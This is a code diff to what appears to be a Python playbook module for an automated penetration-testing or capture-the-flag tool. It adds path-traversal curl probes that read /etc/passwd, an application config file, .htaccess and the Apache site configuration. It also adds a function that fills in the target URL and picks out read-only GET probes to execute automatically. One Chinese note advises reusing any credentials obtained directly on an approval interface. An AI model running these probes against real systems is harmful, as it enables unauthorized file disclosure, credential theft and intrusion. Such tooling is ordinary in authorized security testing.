@@ -64,6 +64,14 @@ PLAYBOOKS: list[dict] = [
             "curl -s '{base}/download.php?id=../../../../etc/passwd'",
             "curl -s '{base}/download.php?id=../includes/config.php'",
             "curl -s '{base}/download.php?id=../.htaccess'",
+            "读 000-default.conf / DirectoryIndex 找真实 handler；扫描保留 403（不要只留 200）",
+        ],
+        "probes": [
+            "curl -s '{base}/download.php?id=../../../../etc/passwd'",
+            "curl -s '{base}/download.php?id=../includes/config.php'",
+            "curl -s '{base}/download.php?id=../.htaccess'",
+            "curl -s '{base}/download.php?id=../../../../etc/apache2/sites-enabled/000-default.conf'",
+            "curl -s '{base}/download.php?id=../../../../var/www/html/.htaccess'",
         ],
         "stop": "3 个文件名猜不中即读 DirectoryIndex/rewrite；拿到凭据后直接在审批接口复用。",
     },
@@ -144,6 +152,26 @@ def first_get_step(playbook: dict, target: str = "") -> str | None:
             continue
         return cmd
     return None
+
+
+def safe_probes(playbook: dict, target: str = "", *, limit: int = 4) -> list[str]:
+    """返回最多 limit 条可安全自动执行的只读 GET 探针。"""
+    if not target:
+        return []
+    base = _base_for(target)
+    out: list[str] = []
+    for step in playbook.get("probes") or ([first_get_step(playbook, target)]):
+        if not step:
+            continue
+        cmd = step.replace("{base}", base).replace("{target}", target or "<target>")
+        if not cmd.startswith(_SAFE_GET_PREFIX):
+            continue
+        if any(token in cmd for token in _UNSAFE_TOKENS):
+            continue
+        out.append(cmd)
+        if len(out) >= limit:
+            break
+    return out
 
 
 def dump_match(text: str) -> str:
